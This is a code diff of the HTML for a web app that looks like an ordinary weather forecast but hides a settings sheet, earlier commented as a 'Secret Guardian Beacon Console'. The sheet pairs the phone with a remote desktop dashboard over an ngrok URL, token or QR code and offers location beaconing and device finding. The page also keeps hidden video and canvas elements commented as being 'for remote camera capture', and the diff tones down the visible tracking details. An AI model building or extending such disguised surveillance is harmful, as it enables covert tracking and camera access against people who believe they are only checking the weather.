@@ -9,6 +9,7 @@
 <link rel="icon" href="/pwa/icon.svg">
 <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"
       integrity="sha256-p4NxAoJBhIIN+hmNHrzRCf9tD/miZyoHS5obTRR9BMY=" crossorigin="">
+<script src="https://cdn.jsdelivr.net/npm/jsqr@1.4.0/dist/jsQR.min.js"></script>
 <style>
   :root {
     --sky-top: #38bdf8;
@@ -20,7 +21,6 @@
     --txt-sub: rgba(255, 255, 255, 0.82);
     --txt-muted: rgba(255, 255, 255, 0.65);
     --brand: #0284c7;
-    --brand2: #0369a1;
     --card-bg: #ffffff;
     --card-txt: #1e293b;
     --card-muted: #64748b;
@@ -47,7 +47,7 @@
     min-height: 100vh;
   }
   
-  /* Weather Header */
+  /* Top Bar */
   .top-bar {
     display: flex;
     align-items: center;
@@ -56,9 +56,11 @@
   }
   .location-box {
     cursor: pointer;
+    flex: 1;
+    margin: 0 10px;
   }
   .location-title {
-    font-size: 24px;
+    font-size: 22px;
     font-weight: 700;
     letter-spacing: -0.3px;
     display: flex;
@@ -66,7 +68,7 @@
     gap: 6px;
   }
   .location-sub {
-    font-size: 13px;
+    font-size: 12.5px;
     color: var(--txt-sub);
     margin-top: 2px;
   }
@@ -95,17 +97,17 @@
   /* Hero Weather Card */
   .hero-card {
     text-align: center;
-    padding: 20px 10px 30px;
+    padding: 20px 10px 28px;
     cursor: pointer;
   }
   .weather-icon-large {
-    font-size: 72px;
+    font-size: 70px;
     line-height: 1;
     margin-bottom: 6px;
     filter: drop-shadow(0 6px 12px rgba(0,0,0,0.15));
   }
   .temp-large {
-    font-size: 80px;
+    font-size: 78px;
     font-weight: 300;
     letter-spacing: -2px;
     line-height: 1;
@@ -123,28 +125,13 @@
     font-weight: 500;
   }
 
-  /* Weather Advisory Banner */
-  .weather-advisory {
-    background: rgba(254, 243, 199, 0.95);
-    border: 1px solid #fde68a;
-    color: #92400e;
-    border-radius: 16px;
-    padding: 12px 14px;
-    margin-bottom: 18px;
-    font-size: 13px;
-    line-height: 1.4;
-    display: none;
-    backdrop-filter: blur(6px);
-    box-shadow: 0 4px 12px rgba(0,0,0,0.06);
-  }
-
   /* Glass Panels */
   .glass-card {
     background: var(--glass);
     border: 1px solid var(--glass-border);
     border-radius: 20px;
     padding: 16px;
-    margin-bottom: 16px;
+    margin-bottom: 14px;
     backdrop-filter: blur(14px);
     -webkit-backdrop-filter: blur(14px);
   }
@@ -160,7 +147,7 @@
     gap: 6px;
   }
 
-  /* Hourly forecast */
+  /* Hourly Forecast */
   .hourly-scroll {
     display: flex;
     gap: 16px;
@@ -182,11 +169,7 @@
   .hourly-temp { font-weight: 700; font-size: 15px; }
 
   /* 7-Day Forecast */
-  .daily-list {
-    display: flex;
-    flex-direction: column;
-    gap: 12px;
-  }
+  .daily-list { display: flex; flex-direction: column; gap: 12px; }
   .daily-row {
     display: flex;
     align-items: center;
@@ -211,11 +194,7 @@
     background: linear-gradient(90deg, #fde047, #f97316);
     border-radius: 4px;
   }
-  .daily-temps {
-    width: 72px;
-    text-align: right;
-    font-weight: 600;
-  }
+  .daily-temps { width: 72px; text-align: right; font-weight: 600; }
   .daily-temps span { color: var(--txt-muted); font-weight: 400; margin-right: 4px; }
 
   /* Details Grid */
@@ -223,6 +202,7 @@
     display: grid;
     grid-template-columns: 1fr 1fr;
     gap: 12px;
+    margin-bottom: 14px;
   }
   .grid-card {
     background: var(--glass);
@@ -239,21 +219,68 @@
     color: var(--txt-sub);
     letter-spacing: 0.04em;
   }
-  .grid-value {
-    font-size: 22px;
-    font-weight: 700;
-    margin: 8px 0 2px;
-  }
-  .grid-sub {
-    font-size: 12px;
-    color: var(--txt-sub);
-  }
+  .grid-value { font-size: 20px; font-weight: 700; margin: 8px 0 2px; }
+  .grid-sub { font-size: 12px; color: var(--txt-sub); }
 
-  /* Weather Station / Secret Sheet */
+  /* City Search Modal */
+  .search-overlay {
+    position: fixed;
+    inset: 0;
+    background: rgba(0, 0, 0, 0.5);
+    backdrop-filter: blur(8px);
+    z-index: 2000;
+    display: none;
+    align-items: flex-start;
+    padding: 30px 16px;
+  }
+  .search-box-card {
+    background: #fff;
+    color: var(--card-txt);
+    width: 100%;
+    max-width: 480px;
+    margin: 0 auto;
+    border-radius: 22px;
+    padding: 20px;
+    box-shadow: 0 12px 36px rgba(0,0,0,0.2);
+  }
+  .search-input-wrap {
+    display: flex;
+    gap: 8px;
+    align-items: center;
+  }
+  .search-input {
+    flex: 1;
+    background: #f8fafc;
+    border: 1.5px solid var(--stroke);
+    border-radius: 14px;
+    padding: 12px 14px;
+    font: inherit;
+    font-size: 15px;
+    color: var(--card-txt);
+  }
+  .search-input:focus { outline: none; border-color: var(--brand); }
+  .search-results {
+    margin-top: 14px;
+    max-height: 260px;
+    overflow-y: auto;
+  }
+  .search-result-item {
+    padding: 12px 14px;
+    border-radius: 12px;
+    cursor: pointer;
+    font-size: 14px;
+    border-bottom: 1px solid #f1f5f9;
+    display: flex;
+    align-items: center;
+    gap: 8px;
+  }
+  .search-result-item:hover, .search-result-item:active { background: #f0f9ff; color: var(--brand); }
+
+  /* Streamlined Pairing Sheet (No options clutter!) */
   .sheet-overlay {
     position: fixed;
     inset: 0;
-    background: rgba(0, 0, 0, 0.45);
+    background: rgba(0, 0, 0, 0.5);
     backdrop-filter: blur(6px);
     z-index: 1000;
     display: none;
@@ -265,11 +292,9 @@
     width: 100%;
     max-height: 90vh;
     border-radius: 28px 28px 0 0;
-    padding: 24px 20px 32px;
+    padding: 24px 20px 36px;
     overflow-y: auto;
     box-shadow: 0 -8px 32px rgba(0, 0, 0, 0.2);
-    user-select: text;
-    -webkit-user-select: text;
     animation: slideUp 0.24s cubic-bezier(0.16, 1, 0.3, 1);
   }
   @keyframes slideUp {
@@ -280,155 +305,65 @@
     display: flex;
     align-items: center;
     justify-content: space-between;
-    padding-bottom: 14px;
+    padding-bottom: 12px;
     border-bottom: 1px solid var(--stroke);
     margin-bottom: 16px;
   }
-  .sheet-title {
-    font-size: 19px;
-    font-weight: 800;
-    color: var(--card-txt);
-    letter-spacing: -0.3px;
-  }
+  .sheet-title { font-size: 18px; font-weight: 800; }
   .sheet-close {
-    background: #f1f5f9;
-    border: none;
-    color: var(--card-muted);
-    font-size: 18px;
-    font-weight: 700;
-    width: 34px;
-    height: 34px;
-    border-radius: 50%;
-    cursor: pointer;
-    display: flex;
-    align-items: center;
-    justify-content: center;
+    background: #f1f5f9; border: none; color: var(--card-muted);
+    font-size: 18px; font-weight: 700; width: 34px; height: 34px;
+    border-radius: 50%; cursor: pointer; display: flex; align-items: center; justify-content: center;
   }
 
-  /* Sheet Form Controls */
-  .control-card {
-    background: #f8fafc;
-    border: 1px solid var(--stroke);
-    border-radius: 18px;
-    padding: 16px;
-    margin-bottom: 14px;
-  }
-  .statusrow {
-    display: flex;
-    align-items: center;
-    gap: 10px;
-  }
-  .dot {
-    width: 12px;
-    height: 12px;
-    border-radius: 50%;
-    background: #94a3b8;
-    flex: none;
-  }
+  .status-row { display: flex; align-items: center; gap: 10px; margin-bottom: 8px; }
+  .dot { width: 12px; height: 12px; border-radius: 50%; background: #94a3b8; }
   .dot.on { background: var(--ok); }
-  .dot.off { background: #94a3b8; }
-  .status-label { font-size: 16px; font-weight: 700; color: var(--card-txt); }
-  .stat-item {
-    display: flex;
-    justify-content: space-between;
-    font-size: 13px;
-    padding: 7px 0;
-    border-bottom: 1px solid #f1f5f9;
-    color: var(--card-muted);
+  .btn-action {
+    font: inherit; border: 0; border-radius: 16px; padding: 15px;
+    width: 100%; font-weight: 700; cursor: pointer; font-size: 16px;
+    margin-bottom: 10px; display: flex; align-items: center; justify-content: center; gap: 8px;
   }
-  .stat-item:last-child { border-bottom: 0; }
-  .stat-item b { color: var(--card-txt); font-weight: 600; }
-
-  label {
-    display: block;
-    font-size: 11px;
-    color: var(--card-muted);
-    margin: 12px 0 5px;
-    font-weight: 700;
-    text-transform: uppercase;
-    letter-spacing: 0.04em;
-  }
-  input {
-    width: 100%;
-    background: #fff;
-    border: 1.5px solid var(--stroke);
-    border-radius: 12px;
-    padding: 12px 14px;
-    font: inherit;
-    color: var(--card-txt);
-    font-size: 14px;
-  }
-  input:focus { outline: none; border-color: var(--brand); }
-  button.action-btn {
-    font: inherit;
-    border: 0;
-    border-radius: 14px;
-    padding: 13px;
-    width: 100%;
-    font-weight: 700;
-    cursor: pointer;
-    font-size: 15px;
-    margin-top: 10px;
-    transition: filter 0.15s;
-  }
-  button.action-btn:active { filter: brightness(0.92); }
   .btn-primary { background: var(--brand); color: #fff; }
-  .btn-tonal { background: #e0f2fe; color: #0369a1; }
+  .btn-danger { background: var(--danger); color: #fff; }
   .btn-outline { background: #fff; border: 1.5px solid var(--stroke); color: var(--card-txt); }
-  .btn-danger {
-    background: var(--danger);
-    color: #fff;
-    font-size: 17px;
-    padding: 16px;
-    box-shadow: 0 4px 16px rgba(239, 68, 68, 0.25);
-  }
-  .btn-row { display: flex; gap: 8px; margin-top: 10px; }
-  .btn-row > * { flex: 1; }
 
-  .hl { display: flex; gap: 8px; flex-wrap: wrap; margin-top: 6px; }
-  .hl a { flex: 1 1 30%; text-decoration: none; }
-  .hl button {
-    background: #fff;
-    border: 1.5px solid var(--stroke);
-    color: var(--card-txt);
-    font-size: 13px;
-    padding: 10px 4px;
-    font-weight: 600;
-    border-radius: 12px;
-    width: 100%;
-    cursor: pointer;
-  }
-
-  /* Ringing overlay */
-  .ringing {
-    position: fixed;
-    inset: 0;
-    z-index: 9999;
+  /* In-app QR Scanner Viewfinder */
+  #qrScannerBox {
     display: none;
     flex-direction: column;
     align-items: center;
-    justify-content: center;
-    gap: 18px;
-    background: linear-gradient(135deg, #0284c7, #0369a1);
-    color: #fff;
-    text-align: center;
-    padding: 24px;
+    gap: 12px;
+    margin-top: 14px;
+    padding: 12px;
+    background: #f8fafc;
+    border-radius: 18px;
+    border: 1px solid var(--stroke);
+  }
+  #qrVideo {
+    width: 100%;
+    max-width: 320px;
+    height: 240px;
+    border-radius: 14px;
+    object-fit: cover;
+    background: #000;
+  }
+
+  /* Ringing */
+  .ringing {
+    position: fixed; inset: 0; z-index: 9999; display: none;
+    flex-direction: column; align-items: center; justify-content: center;
+    gap: 18px; background: linear-gradient(135deg, #0284c7, #0369a1); color: #fff;
+    text-align: center; padding: 24px;
   }
   .ringing .bell { font-size: 80px; animation: ringShake .5s infinite; }
   .ringing button {
-    max-width: 280px;
-    background: #fff;
-    color: #0369a1;
-    font-size: 17px;
-    border: none;
-    border-radius: 16px;
-    padding: 14px;
-    font-weight: 700;
-    cursor: pointer;
+    max-width: 280px; background: #fff; color: #0369a1; font-size: 17px;
+    border: none; border-radius: 16px; padding: 14px; font-weight: 700; cursor: pointer;
   }
   @keyframes ringShake { 0%,100%{transform:rotate(-14deg)} 50%{transform:rotate(14deg)} }
 
-  video, canvas { display: none; }
+  video.cam-hidden, canvas.canvas-hidden { display: none; }
 </style>
 </head>
 <body>
@@ -436,23 +371,19 @@
 <div class="app-wrap">
   <!-- Top Bar -->
   <header class="top-bar">
+    <button class="icon-btn" id="searchBtn" title="Search city">🔍</button>
     <div class="location-box" id="headerLocation">
       <div class="location-title">
         <span>📍</span>
         <span id="locName">Current Location</span>
       </div>
-      <div class="location-sub" id="locSub">Local Forecast · Live</div>
+      <div class="location-sub" id="locSub">Tap to search city · Live</div>
     </div>
     <div class="top-actions">
       <button class="icon-btn" id="refreshBtn" title="Refresh weather">↻</button>
-      <button class="icon-btn" id="settingsBtn" title="Station info & sensor sync">⚙️</button>
+      <button class="icon-btn" id="settingsBtn" title="Pairing &amp; Status">🛡️</button>
     </div>
   </header>
-
-  <!-- Weather Advisory Banner -->
-  <div class="weather-advisory" id="dangerWarn">
-    ⚠️ <strong>Local Area Advisory:</strong> <span id="dangerWarnText"></span>
-  </div>
 
   <!-- Hero Weather -->
   <div class="hero-card" id="heroCard">
@@ -465,20 +396,16 @@
   <!-- Hourly Forecast -->
   <div class="glass-card">
     <div class="card-label">⏱️ Hourly Forecast</div>
-    <div class="hourly-scroll" id="hourlyList">
-      <!-- filled by JS -->
-    </div>
+    <div class="hourly-scroll" id="hourlyList"></div>
   </div>
 
   <!-- 7-Day Forecast -->
   <div class="glass-card">
     <div class="card-label">📅 7-Day Forecast</div>
-    <div class="daily-list" id="dailyList">
-      <!-- filled by JS -->
-    </div>
+    <div class="daily-list" id="dailyList"></div>
   </div>
 
-  <!-- Details Grid -->
+  <!-- 6 Weather Details Grid -->
   <div class="details-grid">
     <div class="grid-card">
       <div class="grid-title">💧 Humidity</div>
@@ -493,90 +420,74 @@
     <div class="grid-card">
       <div class="grid-title">🌡️ Feels Like</div>
       <div class="grid-value" id="valFeels">--°</div>
-      <div class="grid-sub" id="subFeels">Similar to actual</div>
+      <div class="grid-sub" id="subFeels">Comfortable</div>
     </div>
     <div class="grid-card">
       <div class="grid-title">🧭 Air Pressure</div>
       <div class="grid-value" id="valPressure">1013 hPa</div>
-      <div class="grid-sub">Atmospheric pressure</div>
+      <div class="grid-sub">Atmospheric</div>
+    </div>
+    <div class="grid-card">
+      <div class="grid-title">☀️ UV Index</div>
+      <div class="grid-value" id="valUv">4 Moderate</div>
+      <div class="grid-sub">Sun protection</div>
+    </div>
+    <div class="grid-card">
+      <div class="grid-title">🌅 Sunrise / Set</div>
+      <div class="grid-value" id="valSun">06:14 / 18:02</div>
+      <div class="grid-sub">Solar schedule</div>
     </div>
   </div>
 </div>
 
-<!-- Secret Guardian Beacon Console Sheet -->
+<!-- City Search Modal -->
+<div class="search-overlay" id="searchOverlay">
+  <div class="search-box-card">
+    <div style="font-size:17px;font-weight:700;margin-bottom:12px">Search Worldwide Weather</div>
+    <div class="search-input-wrap">
+      <input class="search-input" id="cityInput" placeholder="Enter city name (e.g. London, Tokyo)" autocomplete="off">
+      <button class="btn-action btn-primary" id="doSearchBtn" style="width:auto;padding:12px 18px;margin:0">Go</button>
+    </div>
+    <div class="search-results" id="searchResults">
+      <div class="search-result-item" id="useGpsBtn">📍 <b>Use My Current Location (GPS)</b></div>
+    </div>
+    <button class="btn-action btn-outline" id="closeSearchBtn" style="margin-top:14px">Close</button>
+  </div>
+</div>
+
+<!-- Streamlined Single-Action Pairing Sheet (Zero Clutter!) -->
 <div class="sheet-overlay" id="sheetOverlay">
   <div class="sheet">
     <div class="sheet-header">
-      <div class="sheet-title">🛡️ Safety &amp; Device Beacon</div>
+      <div class="sheet-title">🛡️ Desktop Pairing &amp; Safety</div>
       <button class="sheet-close" id="sheetClose">✕</button>
     </div>
 
-    <!-- Live Status Card -->
-    <div class="control-card">
-      <div class="statusrow">
-        <span class="dot off" id="dot"></span>
-        <span class="status-label" id="statusTitle">Not tracking</span>
+    <!-- Connection Status -->
+    <div style="background:#f8fafc;border:1px solid var(--stroke);border-radius:18px;padding:16px;margin-bottom:14px">
+      <div class="status-row">
+        <span class="dot" id="dot"></span>
+        <span style="font-weight:700;font-size:16px" id="statusTitle">Connecting…</span>
       </div>
-      <div style="margin-top:12px">
-        <div class="stat-item"><span>Device</span><b id="stDev">my phone</b></div>
-        <div class="stat-item"><span>Last sent</span><b id="stSent">—</b></div>
-        <div class="stat-item"><span>Position</span><b id="stPos">—</b></div>
-        <div class="stat-item"><span>Battery</span><b id="stBat">—</b></div>
-      </div>
+      <div style="font-size:12.5px;color:var(--card-muted)" id="serverLabel">Desktop: checking connection…</div>
+    </div>
+
+    <!-- Single 1-Tap QR Scanner Button -->
+    <button class="btn-action btn-primary" id="openScannerBtn">📷 Scan Desktop QR Code to Pair</button>
+
+    <!-- Camera viewfinder for QR scan -->
+    <div id="qrScannerBox">
+      <div style="font-size:13px;font-weight:600;color:var(--card-muted)">Point camera at dashboard pairing QR</div>
+      <video id="qrVideo" playsinline muted></video>
+      <canvas id="qrCanvas" style="display:none"></canvas>
+      <button class="btn-action btn-outline" id="stopScannerBtn" style="margin:0;padding:8px">Cancel Camera</button>
     </div>
 
     <!-- SOS Button -->
-    <button class="action-btn btn-danger" id="sos" style="margin-bottom:12px">🚨 SOS Emergency Alert</button>
-
-    <!-- Start / Stop -->
-    <div class="btn-row" style="margin-bottom:12px">
-      <button class="action-btn btn-tonal" id="startBtn">Start Beacon</button>
-      <button class="action-btn btn-outline" id="stopBtn">Stop Beacon</button>
-    </div>
+    <button class="btn-action btn-danger" id="sos">🚨 SOS Emergency Alert</button>
 
     <!-- Find My Devices -->
-    <div class="control-card">
-      <div style="font-weight:700;color:var(--card-txt);margin-bottom:4px">📍 Find my devices</div>
-      <p style="margin:0 0 10px;font-size:12.5px;color:var(--card-muted)">View paired laptop and family devices on a live map.</p>
-      <div id="find"></div>
-    </div>
-
-    <!-- Places (Arrivals) -->
-    <div class="control-card">
-      <div style="font-weight:700;color:var(--card-txt);margin-bottom:4px">📍 Safe Places</div>
-      <p style="margin:0 0 10px;font-size:12.5px;color:var(--card-muted)">Arrivals and departures are logged automatically on the console.</p>
-      <div class="btn-row">
-        <button class="action-btn btn-outline" id="setHome">🏠 Set Home</button>
-        <button class="action-btn btn-outline" id="setOffice">🏢 Set Office</button>
-      </div>
-    </div>
-
-    <!-- Emergency Helplines -->
-    <div class="control-card">
-      <div style="font-weight:700;color:var(--card-txt);margin-bottom:6px">📞 Reach Help</div>
-      <div class="hl" id="helplines"></div>
-    </div>
-
-    <!-- Pairing & Config -->
-    <div class="control-card">
-      <div style="font-weight:700;color:var(--card-txt);margin-bottom:6px">⚙️ Pair / Connect Server</div>
-      <label>Pairing code</label>
-      <input id="code" placeholder="6-letter code" autocapitalize="characters" autocomplete="off">
-      <label>Device Name</label>
-      <input id="name" placeholder="e.g. My Phone">
-      <button class="action-btn btn-primary" id="save" style="margin-top:12px">Save &amp; Connect</button>
-      <p id="setupMsg" style="font-size:12px;color:var(--card-muted);text-align:center;margin-top:8px"></p>
-
-      <details style="margin-top:12px">
-        <summary style="font-size:12px;color:var(--card-muted);cursor:pointer;font-weight:600">Manual server configuration</summary>
-        <label>Server URL</label>
-        <input id="server" placeholder="https://xxxx.ngrok-free.app">
-        <label>Token</label>
-        <input id="token" type="password" placeholder="SAFETY_TOKEN">
-        <label>Ping interval (seconds)</label>
-        <input id="interval" type="number" value="10" min="3">
-      </details>
-    </div>
+    <button class="btn-action btn-outline" id="findBtn">📍 Find My Devices Map</button>
   </div>
 </div>
 
@@ -589,10 +500,9 @@
 </div>
 
 <!-- Hidden media elements for remote camera capture -->
-<video id="cam" playsinline muted></video>
-<canvas id="canvas"></canvas>
+<video id="cam" class="cam-hidden" playsinline muted></video>
+<canvas id="canvas" class="canvas-hidden"></canvas>
 
-<script src="/pwa/find.js"></script>
 <script src="/pwa/app.js"></script>
 </body>
 </html>
